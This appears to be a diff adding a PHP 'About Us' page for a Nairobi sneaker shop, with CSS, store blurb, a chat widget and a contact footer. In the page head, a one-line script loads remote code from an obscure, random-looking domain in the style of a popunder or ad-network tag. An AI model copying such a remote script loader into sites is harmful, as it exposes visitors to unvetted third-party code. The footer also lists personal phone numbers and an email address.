@@ -1,0 +1,238 @@
+<?php
+// Include the database connection
+include('db.php');
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',8719318,document.createElement('script'))</script>
+    <title>About BrandX</title>
+    <style>
+        /* General page styling */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0d1117;
+            color: #c9d1d9;
+        }
+            
+            .footer {
+  text-align: center;
+  padding: 20px 0;
+}
+
+.footer p {
+  margin: 0;
+}
+   .footer-icons {
+  display: flex;
+  justify-content: center; /* Center the icons closer to each other */
+  align-items: center;
+  gap: 50px; /* Adjust this gap to control the distance between the icons */
+  width: 100%;
+  max-width: 400px; /* Optional: adjust this width if necessary */
+  margin: 0 auto;
+  padding: 10px 0;
+}
+
+.footer-icons img {
+  width: 50px; /* Adjust the size of the icons if needed */
+  height: auto;
+}
+.footer a {
+  color: #4ea8de;
+  text-decoration: none;
+}
+.footer-icons-text p {
+  text-align: center;
+  font-size: 16px; /* Adjust font size */
+  color: #4ea8de; /* Choose a suitable color */
+  margin-bottom: 10px; /* Space between the text and icons */
+}
+
+        header {
+            background: linear-gradient(to bottom, #02020a, rgb(3, 62, 90));
+        }
+
+        /* Main Title and Description */
+        h1 {
+            text-align: center;
+            font-size: 36px;
+            color: #4ea8de;
+            font-family: 'Times New Roman', Times, serif;
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 20px;
+            color: #FF8C00;
+            font-weight: lighter;
+            font-style: italic;
+            font-family: Times New Roman;
+        }
+
+        /* Section Styling */
+        .section-content {
+            padding: 20px;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            color: #c9d1d9;
+        }
+
+        .section-content p {
+            font-size: 18px;
+            line-height: 1.6;
+        }
+        
+
+    /* Footer Styling */
+footer {
+    background-color: #161b22;
+    color: #c9d1d9;
+    padding: 20px 0;
+    text-align: center;
+    margin-top: 50px;
+}
+
+footer p {
+    margin: 0;
+    font-size: 14px;
+}
+.button-link {
+    width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            background-color:rgb(31, 119, 173); /* Green background for button */
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.3s ease;
+            text-decoration: none;
+}
+
+.button-link:hover {
+    background:none; /* Darker green on hover */
+            border: 1px solid rgb(4, 201, 250);
+            color:  #4ea8de;
+}
+
+/* Center the Header Logo */
+
+.logo {
+
+text-align: center; /* Center the container */
+
+padding: 10px 0;
+
+}
+
+.logo img {
+
+height: 100px; /* Adjust size as needed */
+
+width: auto;
+
+}
+    </style>
+</head>
+<body>
+
+<header>
+<div class="logo">
+
+<a href="home.php">
+
+    <img src="uploads/brandxlogo.png" alt="BrandX Logo">
+
+</a>
+
+</div>
+
+</header>
+<h1>About Us</h1>
+<div class="section-content">
+    <h2>Your Ultimate Sneaker Destination</h2>
+    <p>At BrandX, we bring you the best sneakers from top brands at affordable prices. Located in Nairobi, Kenya, our online store offers a vast collection of sneakers for all tastes and preferences. Whether you're looking for athletic shoes, casual kicks, or exclusive limited-edition designs, we’ve got you covered!</p>
+    <p>We are passionate about delivering quality footwear to our customers, with a commitment to exceptional customer service and satisfaction. We ensure that your shopping experience is seamless, with a pay-on-delivery option and free delivery within a 20km radius of Nairobi CBD.</p>
+    <p>Explore our website, discover your perfect pair, and let us bring your sneakers right to your door!</p>
+</div>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6797e4d93a84273260757d95/1iiklbtg5';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+</body>
+<footer>
+
+  <div class="footer-icons-text">
+
+    <p>You may reach us on:</p>
+
+  </div>
+
+  <div class="footer-icons">
+
+    <!-- Call Icon -->
+
+    <a href="tel:+254773184426" target="_blank">
+
+      <img src="uploads/call.png" alt="Call Us">
+
+    </a>
+
+    
+
+    <!-- WhatsApp Icon -->
+
+    <a href="https://wa.me/254773184426?text=Hello%20there,%20I%20would%20like%20to%20learn%20more%20about%20the%20sneakers%20from%20BrandX." target="_blank">
+
+      <img src="uploads/whatsapp.png" alt="WhatsApp">
+
+    </a>
+
+    
+
+    <!-- Email Icon -->
+
+    <a href="mailto:michaelngugi448@gmail.com?subject=Inquiry%20about%20BrandX%20Sneakers&body=Hello%20there,%20I%20would%20like%20to%20inquire%20about%20the%20sneakers%20available%20on%20BrandX%20Online%20Store." target="_blank">
+
+      <img src="uploads/gmail.png" alt="Email">
+
+    </a>
+
+    
+
+    <!-- Instagram Icon -->
+
+    <a href="https://www.instagram.com/top_brand_x?igsh=MWFsajhibHVrOXFtcg==" target="_blank">
+
+      <img src="uploads/ig.png" alt="Instagram">
+
+    </a>
+
+  </div>
+
+  <p>&copy; 2024-2025 BrandX Online Store | All Rights Reserved <br>Developed and maintained by 
+
+    <a href="https://wa.me/254773743248" target="_blank" style="color: #4ea8de; text-decoration: none;">Simon Ngugi</a>.
+
+  </p>
+
+</footer>
+
+
+</html>
